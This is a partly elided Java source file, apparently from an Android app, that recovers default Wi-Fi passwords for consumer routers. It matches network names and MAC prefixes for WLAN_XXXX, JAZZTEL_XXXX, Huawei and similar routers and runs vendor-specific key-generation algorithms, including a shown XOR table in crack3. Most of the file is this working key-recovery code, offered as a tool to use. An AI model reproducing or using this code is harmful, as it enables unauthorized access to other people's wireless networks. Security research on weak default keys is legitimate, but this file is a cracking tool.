...
public class CrackNetwork {
	...
	public CrackNetwork(WirelessNetwork w) {
		// TODO: Change this when WirelessNetwork is able to process
		// capabilities.
	...
	private void initFramework(String essid, String bssidU) {
		...
		// matcher_thomson[0] =
		// Pattern.compile("DLink-([0-9A-Fa-f]{6})").matcher(essid);
		// matcher_thomson[1] =
		// Pattern.compile("SpeedTouch([0-9A-Fa-f]{6})").matcher(essid);
		// matcher_thomson[2] =
		// Pattern.compile("Thomson([0-9A-Fa-f]{6})").matcher(essid);
		// matcher_thomson[3] =
		// Pattern.compile("Bbox-([0-9A-Fa-f]{6})").matcher(essid);
		// matcher_thomson[4] =
		// Pattern.compile("privat([0-9A-Fa-f]{6})").matcher(essid);
		// matcher_thomson[5] =
		// Pattern.compile("DMAX([0-9A-Fa-f]{6})").matcher(essid);
		// matcher_thomson[6] =
		// Pattern.compile("INFINITUM([0-9A-Fa-f]{6})").matcher(essid);
		// matcher_thomson[7] =
		// Pattern.compile("Orange-([0-9A-Fa-f]{6})").matcher(essid);
		// matcher_thomson[8] =
		// Pattern.compile("Discus--([0-9A-Fa-f]{6})").matcher(essid);

		/*
		 * For WLAN_XXXX and JAZZTEL_XXXX networks. Processed by crack1()
		 * COMTREND
		 */
		matcher_md5C = new Matcher[12];
		matcher_md5C[0] = Pattern.compile("WLAN_([0-9a-fA-F]{4})").matcher(essid); // WLAN_XXXX
																				   // 64:68:0C:XX:XX:XX
		matcher_md5C[1] = Pattern.compile("(64:68:0C:[0-9A-Fa-f:]{8})").matcher(bssidU);
		matcher_md5C[2] = Pattern.compile("JAZZTEL_([0-9a-fA-F]{4})").matcher(essid); // JAZZTEL_XXXX
																					  // 64:68:0C:XX:XX:XX
		matcher_md5C[3] = Pattern.compile("(64:68:0C:[0-9A-Fa-f:]{8})").matcher(bssidU);
		matcher_md5C[4] = Pattern.compile("WLAN_([0-9a-fA-F]{4})").matcher(essid); // WLAN_XXXX
																				   // 00:1B:20:XX:XX:XX
		matcher_md5C[5] = Pattern.compile("(00:1B:20:[0-9A-Fa-f:]{8})").matcher(bssidU);
		matcher_md5C[6] = Pattern.compile("JAZZTEL_([0-9a-fA-F]{4})").matcher(essid); // JAZZTEL_XXXX
																					  // 00:1B:20:XX:XX:XX
		matcher_md5C[7] = Pattern.compile("(00:1B:20:[0-9A-Fa-f:]{8})").matcher(bssidU);
		matcher_md5C[8] = Pattern.compile("WLAN_([0-9a-fA-F]{4})").matcher(essid); // WLAN_XXXX
																				   // 00:1D:20:XX:XX:XX
		matcher_md5C[9] = Pattern.compile("(00:1D:20:[0-9A-Fa-f:]{8})").matcher(bssidU);
		matcher_md5C[10] = Pattern.compile("JAZZTEL_([0-9a-fA-F]{4})").matcher(essid); // JAZZTEL_XXXX
																					   // 00:1D:20:XX:XX:XX
		matcher_md5C[11] = Pattern.compile("(00:1D:20:[0-9A-Fa-f:]{8})").matcher(bssidU);
		// matcher_md5C[4] =
		// Pattern.compile("JAZZTEL_([0-9a-fA-F]{4})").matcher(essid); //Por lo
		// visto hay 256 claves
		// matcher_md5C[5] =
		// Pattern.compile("(00:1A:2B:[0-9A-Fa-f:]{8})").matcher(bssidU);
		// matcher_md5C[6] =
		// Pattern.compile("WLAN_([0-9a-fA-F]{4})").matcher(essid);
		// matcher_md5C[7] =
		// Pattern.compile("(00:1A:2B:[0-9A-Fa-f:]{8})").matcher(bssidU);
		// matcher_md5C[12] =
		// Pattern.compile("JAZZTEL_([0-9a-fA-F]{4})").matcher(essid);//No est‡
		// comprobado
		// matcher_md5C[13] =
		// Pattern.compile("(38:72:C0:[0-9A-Fa-f:]{8})").matcher(bssidU);
		// matcher_md5C[14] =
		// Pattern.compile("WLAN_([0-9a-fA-F]{4})").matcher(essid);
		// matcher_md5C[15] =
		// Pattern.compile("(38:72:C0:[0-9A-Fa-f:]{8})").matcher(bssidU);
		...
		// matcher_md5Z[4] =
		// Pattern.compile("WLAN_([0-9a-fA-F]{4})").matcher(essid); //WLAN_XXXX
		// //Son TECOM, no vale
		// matcher_md5Z[5] =
		// Pattern.compile("(00:19:15:[0-9A-Fa-f:]{8})").matcher(bssidU);
		// matcher_md5Z[6] =
		// Pattern.compile("JAZZTEL_([0-9a-fA-F]{4})").matcher(essid);
		// //JAZZTEL_XXXX
		// matcher_md5Z[7] =
		// Pattern.compile("(00:19:15:[0-9A-Fa-f:]{8})").matcher(bssidU);
		...
		matcher_md5Z[17] = Pattern.compile("(F4:3E:61:[0-9A-Fa-f:]{8})").matcher(bssidU);// GongJin
																						 // Electronics
																						 // Co.
		matcher_md5Z[18] = Pattern.compile("JAZZTEL_([0-9a-fA-F]{4})").matcher(essid); // JAZZTEL_XXXX
		matcher_md5Z[19] = Pattern.compile("(F4:3E:61:[0-9A-Fa-f:]{8})").matcher(bssidU);// GongJin
																						 // Electronics
																						 // Co.

		matcher_hawei = new Matcher[29]; // HAWEI (macs only) -- crack3()
		// Los que tienen un simple comentario están verificados, los que tienen
		// DOBLE comentario
		// NO FUNCIONAN, pero como la gente se queja...pues hala...
		matcher_hawei[0] = Pattern.compile("(00:1E:10:[0-9A-Fa-f:]{8})").matcher(bssidU);// Huawei
																						 // HG520c,
																						 // debe
																						 // de
																						 // ser
																						 // compatible!
		matcher_hawei[1] = Pattern.compile("(00:22:A1:[0-9A-Fa-f:]{8})").matcher(bssidU);// Visto
																						 // en
																						 // routerkeygen
		matcher_hawei[2] = Pattern.compile("(00:25:68:[0-9A-Fa-f:]{8})").matcher(bssidU);// Visto
																						 // en
																						 // HG520
																						 // español
		matcher_hawei[3] = Pattern.compile("(00:25:9E:[0-9A-Fa-f:]{8})").matcher(bssidU);// Visto
																						 // en
																						 // routerkeygen
		...
		matcher_hawei[9] = Pattern.compile("(20:2B:C1:[0-9A-Fa-f:]{8})").matcher(bssidU);// Visto
																						 // en
																						 // routerkeygen
		...
		matcher_hawei[16] = Pattern.compile("(4C:54:99:[0-9A-Fa-f:]{8})").matcher(bssidU);// Visto
																						  // en
																						  // Telmex,
																						  // HG530
																						  // (pero
		...
		matcher_hawei[20] = Pattern.compile("(64:16:F0:[0-9A-Fa-f:]{8})").matcher(bssidU);// Visto
																						  // a
																						  // varias
																						  // VodafoneXXXX
		matcher_hawei[21] = Pattern.compile("(00:E0:FC:[0-9A-Fa-f:]{8})").matcher(bssidU);// ////Huawei
																						  // wa1003A
		matcher_hawei[22] = Pattern.compile("(00:18:82:[0-9A-Fa-f:]{8})").matcher(bssidU);// ///Por
																						  // lo
																						  // visto
																						  // es
																						  // el
																						  ...
																						  // routers
		// matcher_hawei[23] =
		// Pattern.compile("(30:87:30:[0-9A-Fa-f:]{8})").matcher(bssidU);/////Visto
		// en algunas Vodafone, pero tb en Orange
		...
		matcher_hawei[27] = Pattern.compile("(F4:C7:14:[0-9A-Fa-f:]{8})").matcher(bssidU);// ///Es
																						  // de
																						  // Orange,
																						  // no
																						  // comercializa
																						  ...
																						  // router
		// matcher_hawei[29] =
		// Pattern.compile("(78:1D:BA:[0-9A-Fa-f:]{8})").matcher(bssidU);/////VodafoneInternetMovil
		matcher_hawei[28] = Pattern.compile("(5C:4C:A9:[0-9A-Fa-f:]{8})").matcher(bssidU);// ///Es
																						  // de
																						  // Orange,
																						  // no
																						  // comercializa
																						  // ese
																						  // router
		matcher_wlan4xx = new Matcher[6]; // WLANXXXXXX, YACOMXXXXXX, WIFIXXXXXX
										  // -- crack2()
		...
		// matcher_wlan2X = new Matcher[2]; //WLAN2X, experimental, sólo
		// funciona en un modelo
		// matcher_wlan2X[0] =
		// Pattern.compile("WLAN_([0-9a-fA-F]{2})").matcher(essid);
		// matcher_wlan2X[1] =
		// Pattern.compile("(40:4A:03:[0-9A-Fa-f:]{8})").matcher(bssidU);
	...
	public static String crack1(String iESSID, String iBSSID) {// WLAN_XXXX,JAZZTEL_XXXX
		...
		String BSSID = "";
		// Tratamos la MAC, para diferenciarla de cuando se intruduce con ':', y
	 ...
	 * }
	 * }
	 * public static String crack2(String essid, String bssid) { //WLAN4xx
	 * algorithm for WLANXXXXXX, WIFIXXXXXX & YACOMXXXXXX...
	 * //Log.d("pulWifi","Using WLAN4xx algorithm");
	 * //Log.d("pulWifi", "ESSID -> "+essid);
	 * //Log.d("pulWifi", "MAC -> "+bssid);
	 * String cadenabase =
	 * "0000000000000010011000101102002200020220300330003033040044000404405005500050550600660006066070077000707708008800080880900990009099"
	 * ;
	 ...
	 * for(int i=0;i<13;i++)
	 * arraybase[j][i] =
	 * Integer.parseInt(String.valueOf(cadenabase.charAt((int)((13*j)+i))));
	 * for(int j=0;j<10;j++)
	 * for(int i=0;i<13;i++)
	 * if((i==1)||(i==5)||(i>6))
	 ...
	 * arraybase[j][i]=(arraybase[j][i] ^ ( essidv+ essidw + essidy +
	 * essidz))%16;
	 * for(int j=0;j<10;j++)
	 * for(int i=0;i<13;i++)
	 * {
	...
	public static String crack3(String bssid) {// HAWEI
		...
		a.append(key[((a2[mac[0]]) ^ (n11[mac[1]]) ^ (a7[mac[2]]) ^ (a8[mac[3]]) ^ (a14[mac[4]]) ^ (a5[mac[5]])
				^ (a5[mac[6]]) ^ (a2[mac[7]]) ^ (a0[mac[8]]) ^ (a1[mac[9]]) ^ (a15[mac[10]]) ^ (a0[mac[11]]) ^ 13)]);
		a.append(key[((n5[mac[0]]) ^ (n12[mac[1]]) ^ (a5[mac[2]]) ^ (a7[mac[3]]) ^ (a2[mac[4]]) ^ (a14[mac[5]])
				^ (a1[mac[6]]) ^ (a5[mac[7]]) ^ (a0[mac[8]]) ^ (a0[mac[9]]) ^ (n31[mac[10]]) ^ (a15[mac[11]]) ^ 4)]);
		a.append(key[((a3[mac[0]]) ^ (a5[mac[1]]) ^ (a2[mac[2]]) ^ (a10[mac[3]]) ^ (a7[mac[4]]) ^ (a8[mac[5]])
				^ (a14[mac[6]]) ^ (a5[mac[7]]) ^ (a5[mac[8]]) ^ (a2[mac[9]]) ^ (a0[mac[10]]) ^ (a1[mac[11]]) ^ 7)]);
		a.append(key[((n6[mac[0]]) ^ (n13[mac[1]]) ^ (a8[mac[2]]) ^ (a2[mac[3]]) ^ (a5[mac[4]]) ^ (a7[mac[5]])
				^ (a2[mac[6]]) ^ (a14[mac[7]]) ^ (a1[mac[8]]) ^ (a5[mac[9]]) ^ (a0[mac[10]]) ^ (a0[mac[11]]) ^ 14)]);
		a.append(key[((n7[mac[0]]) ^ (n14[mac[1]]) ^ (a3[mac[2]]) ^ (a5[mac[3]]) ^ (a2[mac[4]]) ^ (a10[mac[5]])
	...
	// String BSSID = "";
	// Tratamos la MAC, para diferenciarla de cuando se intruduce con ':', y la
	...
	public boolean isCrackeable() {
		if (mCapabilities.equals("") || mCapabilities == null) return true;
		// for(Matcher match : matcher_thomson)
		// if(match.find())
		// return true;
		for (int x = 0; x < matcher_md5C.length; x += 2)
			if (matcher_md5C[x].find() && matcher_md5C[x + 1].find()) return true;
		for (int x = 0; x < matcher_md5Z.length; x += 2)
			if (matcher_md5Z[x].find() && matcher_md5Z[x + 1].find()) return true;
		for (Matcher match : matcher_hawei)
			if (match.find() && mCapabilities != null /*
													   * &&
													   * mCapabilities.contains
													   * ("WEP")
													   */) return true;
		for (int x = 0; x < matcher_wlan4xx.length; x += 2)
			if (matcher_wlan4xx[x].find() && matcher_wlan4xx[x + 1].find()) return true;
	...
	public String crackNetwork() {
		if (mCapabilities.equals("") || mCapabilities == null) return "NOPASSNOPASSNOPASSNOPASS"; // TODO:
																								  // Change
																								  // this
																								  // to
																								  // empty
		...
		for (Matcher match : matcher_hawei)
			if (match.find()) return crack3(match.group(1).replace(":", ""));
		for (int x = 0; x < matcher_wlan4xx.length; x += 2)
			if (matcher_wlan4xx[x].find() && matcher_wlan4xx[x + 1].find())
				return crack2(matcher_wlan4xx[x].group(1), matcher_wlan4xx[x + 1].group(1).toUpperCase());
		...
		// return crack_wlan2X_beta(matcher_wlan2X[x+1].group(1).replace(":",
		// "").toUpperCase());
		// }
		// TODO: Thomson algorithm is disabled.
		// for(Matcher match : matcher_thomson)
